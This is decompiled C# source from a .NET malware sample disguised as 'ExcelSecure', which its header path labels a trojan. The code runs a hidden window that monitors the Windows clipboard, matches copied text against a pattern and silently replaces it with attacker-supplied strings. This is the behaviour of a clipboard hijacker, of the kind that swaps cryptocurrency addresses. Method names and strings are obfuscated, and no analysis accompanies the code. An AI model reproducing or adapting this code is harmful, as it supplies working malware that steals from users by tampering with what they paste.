// Decompiled with JetBrains decompiler
// Type: ConsoleApplication7.driveNotification
// Assembly: ExcelSecure, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3DF6910A-C42C-4EF9-88D0-6212C444355A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.Win32.Generic-248e9b6751d0c1f6d0f290f8d6bd7fca60eb0ef0821720de80dd3a4d007674d1.exe

using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7
{
  public sealed class driveNotification
  {
    private bool _FlushAsyncInternal_d__38(Regex _param1) => _param1.Match(Wait.EnumEvents).Success ? Convert.ToInt32("1", 2) != 0 : -24886 > 82567;

    public class NotificationForm : Form
    {
      private static int Key;

      void Form.WndProc(ref Message m)
      {
        if (m.Msg == Convert.ToInt32("31d", 16))
        {
          Wait.EnumEvents = driveNotification.NotificationForm.GetText();
          string enumEvents = Wait.EnumEvents;
          string str1 = "游渹湫";
          // ISSUE: reference to a compiler-generated method
          driveNotification.NotificationForm.IsTypeRef.\u202A‍‍​‮‍⁪‬‫⁪‌⁭⁫⁯​‬‌‍​‮‮⁪⁮‍​‭⁬‏⁬⁯⁫⁪‎⁭‏⁯‫⁪‏⁫‮(ref str1, new object[3]
          {
            (object) "ẩ䉈",
            (object) '\u0C3A',
            (object) 303
          });
          string str2 = str1;
          if (enumEvents.StartsWith(str2))
          {
            if (((driveNotification) this)._FlushAsyncInternal_d__38(Wait.PreserveSigAttribute) && !Wait.EnumEvents.Contains(Wait.AbandonedMutexException))
              driveNotification.NotificationForm.SetText(Wait.PreserveSigAttribute.Replace(Wait.EnumEvents, Wait.AbandonedMutexException));
          }
          else if (((driveNotification) this)._FlushAsyncInternal_d__38(Wait.PreserveSigAttribute) && !Wait.EnumEvents.Contains(Wait.CompareNotLessThan))
            driveNotification.NotificationForm.SetText(Wait.PreserveSigAttribute.Replace(Wait.EnumEvents, Wait.CompareNotLessThan));
        }
        // ISSUE: explicit non-virtual call
        __nonvirtual (((Form) this).WndProc(ref m));
      }

      CreateParams Form.CreateParams
      {
        get
        {
          CreateParams createParams = __nonvirtual (((Form) this).CreateParams);
          createParams.ExStyle |= (int) '\u0080';
          return createParams;
        }
      }

      public static string GetText()
      {
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        driveNotification.NotificationForm.StartAt startAt = (driveNotification.NotificationForm.StartAt) new Wait.ConvertToUInt32RoundToEven();
        ((Wait) startAt).Types = string.Empty;
        // ISSUE: reference to a compiler-generated method
        Thread thread = new Thread(new ThreadStart(((Wait.ConvertToUInt32RoundToEven) startAt).Demand));
        thread.SetApartmentState((ApartmentState) string.Empty.Length);
        thread.Start();
        thread.Join();
        return ((Wait) startAt).Types;
      }

      public static void SetText(string txt)
      {
        // ISSUE: object of a compiler-generated type is created
        // ISSUE: variable of a compiler-generated type
        driveNotification.NotificationForm.IsTypeRef isTypeRef = (driveNotification.NotificationForm.IsTypeRef) new driveNotification.NotificationForm.StartAt();
        ((Wait) isTypeRef).get_ControlThread = txt;
        // ISSUE: method pointer
        Thread thread = new Thread(new ThreadStart((object) isTypeRef, __methodptr(get_OEMCodePage)));
        thread.SetApartmentState((ApartmentState) Convert.ToInt32("0", 16));
        thread.Start();
        thread.Join();
      }

      static NotificationForm() => Wait.EnumEvents = driveNotification.NotificationForm.GetText();

      public bool ValueTaskSourceStatus(string _param1) => _param1 == ((Wait) this).VARFLAG_FREQUESTEDIT.ToLower();
    }
  }
}
